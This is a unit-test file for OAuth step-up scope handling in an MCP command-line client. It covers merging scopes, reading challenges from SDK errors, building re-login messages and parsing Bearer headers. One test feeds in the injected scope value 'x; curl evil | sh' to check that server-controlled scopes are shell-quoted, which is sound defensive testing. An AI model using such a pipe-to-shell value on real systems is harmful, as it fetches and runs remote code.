/**
 * Unit tests for OAuth scope challenges (MCP step-up authorization)
 */

import {
  describeScopeChallenge,
  findScopeChallenge,
  parseBearerChallenge,
  unionScopes,
} from '../../../../src/lib/auth/scope-challenge.js';
import { isAuthenticationError, ServerError } from '../../../../src/lib/errors.js';
import { quoteShellArg } from '../../../../src/lib/utils.js';

/** Shape of the SDK's `InsufficientScopeError` (branded on the class, not the instance). */
class FakeInsufficientScopeError extends Error {
  static mcpBrand = 'mcp.InsufficientScopeError';
  requiredScope?: string;
  errorDescription?: string;
  constructor(init: { requiredScope?: string; errorDescription?: string }) {
    super(`Insufficient scope${init.requiredScope ? `: required "${init.requiredScope}"` : ''}`);
    if (init.requiredScope !== undefined) this.requiredScope = init.requiredScope;
    if (init.errorDescription !== undefined) this.errorDescription = init.errorDescription;
  }
}

describe('unionScopes', () => {
  it('merges strings and arrays, keeping first-seen order and dropping duplicates', () => {
    expect(unionScopes('files:read', ['files:read', 'files:write'], 'admin')).toBe(
      'files:read files:write admin'
    );
  });

  it('ignores empty input and returns undefined when nothing is left', () => {
    expect(unionScopes(undefined, '', [])).toBeUndefined();
    expect(unionScopes('  a   b ', undefined)).toBe('a b');
  });
});

describe('findScopeChallenge', () => {
  it('reads the challenge off the SDK error itself', () => {
    const error = new FakeInsufficientScopeError({
      requiredScope: 'files:write',
      errorDescription: 'write access needed',
    });
    expect(findScopeChallenge(error)).toEqual({
      requiredScope: 'files:write',
      errorDescription: 'write access needed',
    });
  });

  it('walks the ServerError wrapper and the cause chain', () => {
    const sdkError = new FakeInsufficientScopeError({ requiredScope: 'x' });
    const wrapped = new ServerError('Failed to call tool t: Insufficient scope', {
      originalError: new Error('outer', { cause: sdkError }),
    });
    expect(findScopeChallenge(wrapped)).toEqual({ requiredScope: 'x' });
  });

  it('returns undefined for other errors, strings and cycles', () => {
    const loop = new Error('loop');
    loop.cause = loop;
    expect(findScopeChallenge(new Error('HTTP 403 Forbidden'))).toBeUndefined();
    expect(findScopeChallenge('Insufficient scope')).toBeUndefined();
    expect(findScopeChallenge(loop)).toBeUndefined();
    expect(findScopeChallenge(undefined)).toBeUndefined();
  });

  it('leaves out empty challenge fields', () => {
    expect(findScopeChallenge(new FakeInsufficientScopeError({ requiredScope: '' }))).toEqual({});
  });
});

describe('describeScopeChallenge', () => {
  const quote = (value: string) => quoteShellArg(value, 'linux');

  it('prints the union login for a profile session and the restart', () => {
    const message = describeScopeChallenge(
      { requiredScope: 'files:write', errorDescription: 'File write permission required' },
      {
        serverUrl: 'https://mcp.example.com',
        sessionName: '@app',
        profile: { name: 'default', scopes: ['files:read'] },
        quote,
      }
    );
    expect(message).toContain('requires scope "files:write"');
    expect(message).toContain('Server says: File write permission required');
    expect(message).toContain('Profile "default" was granted: files:read');
    expect(message).toContain(
      'mcpc login https://mcp.example.com --scope "files:read files:write"'
    );
    expect(message).not.toContain('--profile');
    expect(message).toContain('mcpc @app restart');
  });

  it('names a non-default profile and quotes server-controlled scopes', () => {
    const message = describeScopeChallenge(
      { requiredScope: 'x; curl evil | sh' },
      {
        serverUrl: 'https://mcp.example.com',
        profile: { name: 'work', scopes: undefined },
        quote,
      }
    );
    expect(message).toContain('--profile work --scope "x; curl evil | sh"');
    expect(message).not.toContain('restart');
    expect(message).not.toContain('was granted');
  });

  it('tells a header-authenticated session that mcpc cannot request the scope', () => {
    const message = describeScopeChallenge(
      { requiredScope: 'files:write' },
      { serverUrl: 'https://mcp.example.com', sessionName: '@s', quote }
    );
    expect(message).toContain('does not use an OAuth profile');
    expect(message).toContain('mcpc login https://mcp.example.com --scope files:write');
  });

  it('copes with a challenge that names no scope', () => {
    const message = describeScopeChallenge(
      {},
      { serverUrl: 'https://mcp.example.com', profile: { name: 'default' }, quote }
    );
    expect(message).toContain('requires a scope for this operation');
    expect(message.trimEnd().endsWith('mcpc login https://mcp.example.com')).toBe(true);
    expect(message).not.toContain('--scope');
  });

  it('never reads as an authentication failure (the session must stay live)', () => {
    for (const profile of [{ name: 'default', scopes: ['a'] }, undefined]) {
      const message = describeScopeChallenge(
        { requiredScope: 'b', errorDescription: 'needs b' },
        { serverUrl: 'https://mcp.example.com', sessionName: '@s', quote, profile }
      );
      expect(isAuthenticationError(message)).toBe(false);
    }
  });
});

describe('parseBearerChallenge', () => {
  it('parses quoted and bare parameters of a Bearer challenge', () => {
    expect(
      parseBearerChallenge(
        'Bearer error="insufficient_scope", scope="files:read files:write", ' +
          'resource_metadata="https://mcp.example.com/.well-known/oauth-protected-resource", ' +
          'error_description="File write permission \\"required\\""'
      )
    ).toEqual({
      scope: 'files:read files:write',
      error: 'insufficient_scope',
      errorDescription: 'File write permission "required"',
      resourceMetadata: 'https://mcp.example.com/.well-known/oauth-protected-resource',
    });
    expect(parseBearerChallenge('bearer error=invalid_token')).toEqual({ error: 'invalid_token' });
  });

  it('finds the Bearer challenge among other schemes and ignores the rest', () => {
    expect(parseBearerChallenge('Basic realm="x", Bearer scope="a"')).toEqual({ scope: 'a' });
    expect(parseBearerChallenge('Basic realm="x"')).toBeUndefined();
    expect(parseBearerChallenge('BearerToken scope="a"')).toBeUndefined();
    expect(parseBearerChallenge(null)).toBeUndefined();
    expect(parseBearerChallenge('Bearer')).toEqual({});
  });
});
